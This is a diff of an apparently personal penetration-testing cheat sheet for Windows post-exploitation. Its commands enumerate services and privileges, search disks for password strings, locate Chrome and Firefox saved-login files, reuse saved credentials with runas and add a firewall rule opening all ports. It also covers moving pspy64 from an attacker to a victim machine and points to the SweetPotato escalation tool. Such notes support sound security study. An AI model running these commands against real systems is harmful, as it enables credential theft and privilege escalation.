@@ -8,6 +8,9 @@ C> whoami /groups
 C> whoami /priv
 c>whoami /fqdn #domain
 
+#check domain
+PS C:\Users\Anakin> (Get-ADDomain).DNSRoot
+contoso.local
 
 #change password 
 PSC> Set-LocalUser -Name "Username" -Password (ConvertTo-SecureString -AsPlainText "NewPassword" -Force)
@@ -25,30 +28,37 @@ Stop-Service -Name "KiteService"
 tasklist /svc | findstr "KiteService"
 taskkill /f /pid [PID]
 
-wmic service where "name='KiteService'" call stopservice
-#check services
 
+#check services
 sc qc 
 sc qc <servcice_name>
-net start | findstr "KiteService"
-tasklist /svc | findstr "svchost"
+sc qc | findstr /i "apache"
+
 wmic service get name,state,startmode
 wmic service where "state='running'" get name,state,startmode
+wmic service where "name='KiteService'" call stopservice
+
 Get-Service
 Get-Service -Name "KiteService"
-Get-WmiObject Win32_Service -Filter "Name='KiteService'"\
+Get-Service | Where-Object {$_.DisplayName -like "*Apache*"} | Format-List Name,DisplayName
 
+Get-WmiObject Win32_Service -Filter "Name='KiteService'"
+
+#start Service 
+net start | findstr "KiteService"
+
+#check schedules tasks
+tasklist /svc | findstr "svchost"
 
 #check service priv
-PSC>Get-WmiObject Win32_Service -Filter "Name='<service_name>'" | Select Name, State, StartMode, StartName, PathName
+PSC> Get-WmiObject Win32_Service -Filter "Name='<service_name>'" | Select Name, State, StartMode, StartName, PathName
 
 #Folder Path Listing
-
 tree /f /a <File>
 
 #grep
 
-type something | findstr /i username
+something | findstr /i username
 
 # Current user info (PS).
 PSC> powershell
@@ -70,15 +80,15 @@ PSC> Get-Process
 
 # Installed applications.
 PSC> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname //32bit
+
 PSC> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname //64bit
 
 
 # Search file.
-
  Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 
-# AD.
-Get-ChildItem -Path C:\Users\ -Include *.txt, *.pdf, *.xls, *.xlsx, *.doc, *.docx, *.ppt, *.pptx, *.odt, *.ods, *.odp, *.ps, *.log, *.ini, *.cfg, *.conf, *.json, *.xml, *.yaml, *.yml, *.md, *.accdb, *.pub, *.one, *.onepkg, *.psd, *.ai, *.indd, *.jpg, *.jpeg, *.png, *.gif, *.bmp, *.tiff, *.ps1, *.bat, *.cmd, *.sh, *.py, *.java, *.cpp, *.c, *.cs, *.js, *.ts, *.html, *.css, *.rb, *.php, *.csv, *.sql, *.zip, *.rar, *.7z, *.tar, *.gz, *.bz2, *.mp3, *.wav, *.mp4, *.avi, *.mov, *.wmv, *.epub, *.mobi -File -Recurse -ErrorAction SilentlyContinue | Out-File C:\temp\out.txt | Select-String -Pattern "NTLM" | Select-Object -Unique Path
+# find files wit these extensions
+findstr /SIM /C:"pass" *.ini *.cfg *.config *.xml
 
 
 #config files 
@@ -90,7 +100,9 @@ Get-ChildItem -Path "C:\inetpub\","C:\xampp\","C:\wamp\","C:\Apache\" -Include *
 
 # Browser saved passwords and backups
 Get-ChildItem -Path "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue
+
 Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\key4.db" -ErrorAction SilentlyContinue
+
 Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" -ErrorAction SilentlyContinue
 
 # Search file contents for password-related keywords
@@ -152,20 +164,15 @@ netsh advfirewall firewall add rule name="Open All Ports" dir=in action=allow pr
 
 #### Runas Command
 runas /user:Administrator /savecred cmd.exe
+runas /netonly /user:user@domain
+
+#check credentials
+runas /netonly /user:DOMAIN.FQDN\USER "cmd.exe /c nltest /dclist:DOMAIN.FQDN"
 
 ```
 
 
-
-**GUI Desktop**
-
-
-```sh
-rdpdesktop <IP>
-
-xfreerdp /v:<ip> /u:<user> /p:<password> +clipboard /cert:ignore
-```
-### pspy64
+#### pspy64
 
 Tool that Enumerate processes without root permession
 
@@ -175,7 +182,13 @@ Steps:
 - transfer it from attacker machine `python server`
 - execute it on victim machine
 
+#### accesschk
 
+check file permessions 
+
+```ls
+.\accesschk.exe /accepteula -quvw stef C:\Users\Administrator\Desktop\Backup.ps1
+```
 #### SweetPotato
 
 `https://github.com/CCob/SweetPotato `
